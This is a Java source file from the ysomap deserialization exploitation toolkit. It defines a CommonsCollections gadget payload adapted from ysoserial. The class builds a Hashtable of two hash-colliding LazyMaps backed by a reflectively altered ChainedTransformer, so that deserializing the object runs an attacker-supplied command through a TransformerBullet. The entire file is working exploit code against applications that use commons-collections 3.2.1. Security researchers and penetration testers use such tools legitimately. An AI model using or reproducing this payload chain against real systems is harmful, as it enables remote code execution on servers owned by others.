package ysomap.gadget.payload.collections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.map.LazyMap;
import ysomap.runner.PayloadTester;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.gadget.ObjectGadget;
import ysomap.gadget.bullet.collections.TransformerBullet;
import ysomap.gadget.payload.Payload;
import ysomap.serializer.Serializer;
import ysomap.serializer.SerializerFactory;
import ysomap.util.Reflections;

import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/**
 * from ysoserial CommonsCollections7
 * @author wh1t3P1g
 * @since 2020/2/18
 */
@SuppressWarnings({"rawtypes","unchecked"})
@Dependencies({"commons-collections:commons-collections:3.2.1"})
@Authors({Authors.SCRISTALLI, Authors.HANYRAX, Authors.EDOARDOVIGNATI})
public class CommonsCollections6 extends Payload<Hashtable> {

    @Override
    public Serializer<?> getSerializer() {
        return SerializerFactory.createSerializer("");
    }

    @Override
    public Hashtable pack(Object obj) throws Exception {
        Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);

        // Use the colliding Maps as keys in Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        Reflections.setFieldValue(transformerChain, "iTransformers", obj);

        // Needed to ensure hash collision after previous manipulations
        lazyMap2.remove("yy");

        return hashtable;
    }

    @Override
    public ObjectGadget getDefaultBullet(String command) {
        return new TransformerBullet(command, "3");
    }

    public static void main(String[] args) {
//        ObjectGadget bullet = new TransformerWithTemplatesImplBullet(null, "3");
        ObjectGadget bullet = new TransformerBullet(null, "3");
        new PayloadTester(CommonsCollections6.class)
                .setBullet(bullet)
                .run();
    }
}
